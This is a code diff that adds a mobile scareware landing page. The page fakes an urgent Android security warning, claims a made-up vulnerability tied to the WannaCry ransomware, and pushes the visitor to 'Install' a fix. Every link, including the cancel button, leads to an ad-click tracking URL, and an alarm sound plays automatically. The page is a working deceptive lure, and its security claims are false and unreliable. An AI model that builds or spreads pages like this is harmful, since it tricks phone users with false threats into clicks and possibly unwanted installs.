@@ -1,0 +1,83 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warning!</title>
+    <link rel="shortcut icon" href="assets/pictures/android.png" type="image/png">
+
+    <!-- CSS  -->
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/fonts.css" rel="stylesheet">
+    <link href="css/media480.css" rel="stylesheet">
+    <link href="css/media320.css" rel="stylesheet">
+
+
+    <!-- fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Jaldi" rel="stylesheet">
+
+  </head>
+
+  <body>
+
+    <div class="black-bg"></div>
+
+    <div class="wrapper" id="wrapper">
+
+      <header class="header">
+
+        <a href="http://adbomb.pro/click.php?lp=1"><img src="assets/pictures/android.svg" class="logo-img"></a>
+        <h2 class="logo-caption">Android Security - WannaCry Killing Tool</h2>
+
+      </header>
+
+      <h1 class="caption">Urgent!</h1>
+
+      <p class="text">The port vulnerability of 'o18x74ht.rs' is detected on your phone which means a hight risk.
+      <br> You need Fix this vulnerability immediately! To avoid the attack by Wanna Cry Ransomware.</p>
+
+      <div class="btn__container">
+
+            <p class="btn btn-accept"><a href="http://adbomb.pro/click.php?lp=1" class="btn-link">Install</a></p>
+            <p class="btn btn-cancel"><a href="http://adbomb.pro/click.php?lp=1" class="btn-link">Cansel</a></p>
+
+          </div>
+
+    </div>
+
+    <div class="overlay-popup" id="overlay-popup"></div>
+
+    <div class="popup" id="popup">
+
+      <div class="popup__container">
+
+        <h1 class="popup-caption">Urgent</h1>
+
+        <p class="popup-text">The port vulnerability of 'o18x74ht.rs' is detected!
+        <br> You need Fix this vulnerability immediately! To avoid the attack by <span class="popup-text-red">Wanna Cry Ransomware</span></p>
+
+        <p class="popup-btn"><a href="#close" class="close" id="close">ok</a></p>
+
+      </div>
+
+    </div>
+
+
+    <audio autoplay="autoplay" preload="">
+        <source src="http://my.stratads.online/sweeps/pl/lp7/alert.ogg" type="audio/ogg">
+    </audio>
+
+    <!-- JS -->
+    <script src="node_modules/mobile-detect/mobile-detect.min.js"></script>
+    <script src="js/model.js"></script>
+    <script>
+      document.getElementById('close').onclick = function() {
+        document.getElementById('popup').style.display = 'none';
+        document.getElementById('overlay-popup').style.display = 'none';
+      }
+    </script>
+
+  </body>
+
+</htmL>
